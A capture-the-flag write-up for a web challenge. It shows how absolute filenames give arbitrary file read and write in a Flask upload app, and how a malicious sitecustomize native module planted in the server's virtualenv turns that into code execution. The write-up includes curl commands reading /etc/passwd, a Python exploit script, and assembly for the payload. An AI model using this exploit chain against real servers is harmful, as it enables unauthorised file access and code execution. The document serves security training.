# File Upload - Write-up (42 solves)

Challenge: “Upload and download files.”

Target: `https://fileupload-e7cb486bb3fd8aaa.chals.uoftctf.org`

Flag: `uoftctf{wri734bl3_libr4ri3s_c4n_b3_d4ng3r0us}`

---

## What the challenge is trying to hide (and “challenge” you with)

The real flag is stored in a file that the web server **cannot read** directly:

- `/flag.txt` is owned by `root` and set to mode `0400` (root-only).
- The Flask app runs as a **non-root** user, so reading `/flag.txt` normally fails.

To still make the challenge solvable, there is a hidden helper binary:

- `/catflag` is **SUID root** (mode `4755`) and prints `/flag.txt`.
- The intended “puzzle” is: **find a way to execute `/catflag`**, even though the web app is unprivileged.

The web app also tries to block obvious attacks with a naive filter:

- It rejects filenames containing `..` (to stop `../` traversal)
- It rejects filenames containing `.p` (to stop uploading/reading Python files like `app.py`, `sitecustomize.py`, etc.)

The trick is that both filters are incomplete.

---

## Key bug #1: Arbitrary file read (LFI) via absolute paths

The app builds a path like this:

```py
file_path = os.path.join("uploads", filename)
```

But in Python, **if `filename` starts with `/`**, it becomes an **absolute path** and `os.path.join` ignores the `uploads/` prefix.

So `filename=/etc/passwd` becomes:

```py
os.path.join("uploads", "/etc/passwd") == "/etc/passwd"
```

### Proof (read `/etc/passwd`)

```bash
curl -sk -X POST https://fileupload-e7cb486bb3fd8aaa.chals.uoftctf.org/read \
  -d 'filename=/etc/passwd'
```

You get the contents of `/etc/passwd` back in the HTML response.

### Why `/flag.txt` doesn’t work yet

Even though you can *point* at `/flag.txt`, the Flask process is unprivileged, so opening it returns “permission denied”, which shows up as a 500 error.

---

## Key bug #2: Arbitrary file write via absolute upload filenames

Uploads are saved like this:

```py
save_path = os.path.join("uploads", file.filename)
file.save(save_path)
```

Same problem: if you upload with a filename that starts with `/`, you can write **anywhere** the process has permission.

### Proof (write to `/tmp`)

```bash
curl -sk https://fileupload-e7cb486bb3fd8aaa.chals.uoftctf.org/upload \
  -F 'file=@-;filename=/tmp/hello.txt' <<< 'hello from CTF'
```

Then read it back:

```bash
curl -sk -X POST https://fileupload-e7cb486bb3fd8aaa.chals.uoftctf.org/read \
  -d 'filename=/tmp/hello.txt'
```

---

## Understanding the runtime (using LFI)

We want to execute `/catflag`, but there is no “run command” endpoint. So we need to turn the arbitrary file write into **code execution**.

One helpful file to read is `/app/app.sh`:

```bash
curl -sk -X POST https://fileupload-e7cb486bb3fd8aaa.chals.uoftctf.org/read \
  -d 'filename=/app/app.sh'
```

It shows the server does:

1. `cd /tmp`
2. `python3 -m venv venv_flask` (virtualenv at `/tmp/venv_flask`)
3. install Flask into that venv
4. run the app with that venv’s Python

You can also confirm the venv exists:

```bash
curl -sk -X POST https://fileupload-e7cb486bb3fd8aaa.chals.uoftctf.org/read \
  -d 'filename=/tmp/venv_flask/pyvenv.cfg'
```

---

## The exploitation idea: `sitecustomize` autoload (no `.py` needed)

Python automatically tries to import a module named `sitecustomize` on startup (after importing `site`).

Normally you’d drop `sitecustomize.py`, but the server blocks filenames containing `.p`, so `.py` is not allowed.

However, Python modules can also be **native extension modules** (`.so` files).

So the plan is:

1. Upload a malicious extension module named:
   - `sitecustomize.cpython-312-x86_64-linux-gnu.so`
2. Place it in the venv site-packages:
   - `/tmp/venv_flask/lib/python3.12/site-packages/`
3. Make it run:
   - `/catflag > /tmp/flag`
4. Force the server to restart so Python imports it.
5. Read `/tmp/flag` using the LFI.

---

## Step-by-step solve

### Step 1 — Upload the malicious `sitecustomize` extension

You need a file named:

`sitecustomize.cpython-312-x86_64-linux-gnu.so`

Upload destination:

`/tmp/venv_flask/lib/python3.12/site-packages/sitecustomize.cpython-312-x86_64-linux-gnu.so`

### Step 2 — Force a restart (so it gets imported)

The Flask app is already running, so it won’t import your new `sitecustomize` until the process restarts.

One reliable way: open a few `/read` requests on a **very large file** (example: the Python shared library), and don’t read the response body (keep the connection open). This tends to make the upstream/proxy kill and restart the pod.

Large file example:

`/usr/local/lib/libpython3.12.so.1.0`

### Step 3 — Read the flag from `/tmp/flag`

After restart, your `sitecustomize` runs `/catflag > /tmp/flag`.

Now just:

```bash
curl -sk -X POST https://fileupload-e7cb486bb3fd8aaa.chals.uoftctf.org/read \
  -d 'filename=/tmp/flag'
```

---

## “One-button” solve script (Python)

This script:

- uploads the `.so`
- triggers a restart using a few streaming requests
- polls until `/tmp/flag` exists

```py
import re
import time
import requests
from pathlib import Path

BASE = "https://fileupload-e7cb486bb3fd8aaa.chals.uoftctf.org"
VERIFY_TLS = False  # CTF infra often uses a self-signed cert

SO_LOCAL = Path("sitecustomize.cpython-312-x86_64-linux-gnu.so")
SO_REMOTE = "/tmp/venv_flask/lib/python3.12/site-packages/sitecustomize.cpython-312-x86_64-linux-gnu.so"
BIG_FILE = "/usr/local/lib/libpython3.12.so.1.0"

def read_file(path: str) -> str | None:
    r = requests.post(f"{BASE}/read", data={"filename": path}, verify=VERIFY_TLS, timeout=10)
    if r.status_code != 200:
        return None
    m = re.search(r"<pre>(.*?)</pre>", r.text, flags=re.S)
    return m.group(1) if m else ""

def upload_file(remote_path: str, data: bytes) -> None:
    r = requests.post(
        f"{BASE}/upload",
        files={"file": (remote_path, data)},
        verify=VERIFY_TLS,
        timeout=20,
    )
    r.raise_for_status()

def main():
    so_bytes = SO_LOCAL.read_bytes()
    upload_file(SO_REMOTE, so_bytes)

    # Trigger a restart by opening a few streaming reads of a big file.
    s = requests.Session()
    for _ in range(3):
        try:
            s.post(f"{BASE}/read", data={"filename": BIG_FILE}, verify=VERIFY_TLS, stream=True, timeout=10)
        except Exception:
            pass

    # Wait for restart + payload to run
    for _ in range(120):
        flag = read_file("/tmp/flag")
        if flag and "uoftctf{" in flag:
            print(flag.strip())
            return
        time.sleep(2)

    raise SystemExit("Flag not found (try re-running).")

if __name__ == "__main__":
    main()
```

---

## Building the malicious `.so` (no Python headers needed)

If you have `as` + `ld` (binutils), you can build an extension module without installing `python3-dev`.

Create `sitecustomize.S`:

```asm
    .section .rodata
cmd:
    .string \"/catflag > /tmp/flag\"
name:
    .string \"sitecustomize\"

    .section .data
    .align 8
moduledef:
    # PyModuleDef_Base (40 bytes): PyObject_HEAD (16) + m_init (8) + m_index (8) + m_copy (8)
    .quad 0
    .quad 0
    .quad 0
    .quad 0
    .quad 0
    # PyModuleDef fields
    .quad name   # m_name
    .quad 0      # m_doc
    .quad -1     # m_size
    .quad 0      # m_methods
    .quad 0      # m_slots
    .quad 0      # m_traverse
    .quad 0      # m_clear
    .quad 0      # m_free

    .text
    .globl PyInit_sitecustomize
    .type PyInit_sitecustomize, @function
PyInit_sitecustomize:
    push %rbp
    mov %rsp, %rbp

    lea cmd(%rip), %rdi
    call system@PLT

    lea moduledef(%rip), %rdi
    mov $1013, %esi        # sys.api_version for CPython 3.12
    call PyModule_Create2@PLT

    pop %rbp
    ret
    .size PyInit_sitecustomize, .-PyInit_sitecustomize

    .section .note.GNU-stack,\"\",@progbits
```

Build it:

```bash
as --64 -o sitecustomize.o sitecustomize.S
ld -shared -o sitecustomize.cpython-312-x86_64-linux-gnu.so sitecustomize.o
```

Now you can run the solve script (or upload it manually).

---

## Why this works (short summary)

- The app’s “path traversal protection” is incomplete: absolute paths bypass `uploads/`.
- That gives both **arbitrary read** and **arbitrary write**.
- The flag is root-only, but `/catflag` is SUID root.
- Writing a `sitecustomize` extension module into the venv gives **code execution on restart**.
- That code runs `/catflag` and saves the output somewhere readable (`/tmp/flag`).
